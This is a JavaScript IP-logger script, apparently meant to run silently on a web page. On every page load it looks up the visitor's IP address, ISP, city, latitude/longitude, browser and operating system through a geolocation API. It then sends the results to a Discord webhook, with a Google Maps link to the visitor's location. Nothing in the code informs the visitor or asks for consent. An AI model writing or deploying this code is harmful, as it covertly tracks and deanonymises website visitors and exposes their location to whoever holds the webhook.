const grabData = async () => {

    //fetch webhook token from config.json
    await fetch("./config.json").then((response) => {

        //return value of config.json
        return response.json().then(function (data) {

            //save it to new Variable
            var dataExport = data;

            //Export Token
            var Webhook = dataExport.Token;

            const request = async () => {

                // Calling synchronous fetch
                const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + dataExport.key);
                const user = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + dataExport.key);

                //waiting for response
                const data = await response.json();
                const AgentData = await user.json();

                // Declaring Some variables For 'data'
                const ip = data.ip;
                const isp = data.isp + " (" + data.continent_code + ")";
                const country = data.country_name;
                const regioncode = data.country_code2.toLowerCase();
                const region = data.country_code3 + " (" + data.country_code2 + ")";
                const city = data.city;
                const languages = data.languages;
                const lat = data.latitude;
                const lon = data.longitude;
                const callcode = data.calling_code;
                const flag = data.country_flag;
                const currency = data.currency.name;
                const currentDate = new Date();
                
                // Declaring Some variables For 'agent'
                const broname = AgentData.name + '/' + AgentData.type;
                const engine = AgentData.engine.name + '(' + AgentData.engine.versionMajor + ')';
                const op = AgentData.operatingSystem.name + " " +AgentData.operatingSystem.versionMajor;

                // Open XMLHttpRequest POST Request
                const postRequest = new XMLHttpRequest();
                postRequest.open("POST", Webhook);
                postRequest.setRequestHeader("Content-type", "application/json");

                //Creating Discord Webhook
                const params = {
                    username: "Website Visited From "+ country + "/" + city,
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/7013/7013144.png',
                    content: null,
                    embeds: [
                        {
                            title: "** ** ** **:globe_with_meridians: IP Adress: " + ip,
                            "url": "https://whatismyipaddress.com/ip/"+ ip,
                            description: "** **",
                            "thumbnail": {
                                "url": flag
                              },
                            color: 1993898,
                            fields: [
                                {
                                    name: ":telephone: ISP: ",
                                    value: isp,
                                    inline: true,
                                },
                                {
                                    name: ":flag_" + regioncode + ": Country & Region: ",
                                    value: country + "/" + city + " - " + region,
                                    inline: true,
                                },
                                {
                                    name: ":round_pushpin: Location: ",
                                    value: "Longitude: " + lon + "\n" + "Latitude: " + lat +"\n"+"Google Map: [Click](https://www.google.com/maps/@"+lat+","+lon+",6z)",
                                    inline: true,
                                },
                                {
                                    name: ":bust_in_silhouette: Client info: ",
                                    value: ":satellite: Browser: "+ broname + "\n"+ ":gear: Engine: "+ engine +"\n"+ ":computer: OS: "+op+"\n",
                                    inline: true,
                                },
                                {
                                    name: ":incoming_envelope: Extra info: ",
                                    value: ":calling: Call Code: ("+ callcode +")\n"+ ":speaking_head: Lang's: "+languages+"\n"+":coin: Currency: "+ currency,
                                    inline: true,
                                },
                            ],
                            footer: {
                                text: "Visited on: " + currentDate,
                                icon_url:
                                    "https://cdn-icons-png.flaticon.com/512/2088/2088617.png",
                            },
                        },
                    ],
                };

                //Send Webhook
                postRequest.send(JSON.stringify(params));
            };

            // Call POST function
            request();
        });
    });
}

// Start App
grabData();
setTimeout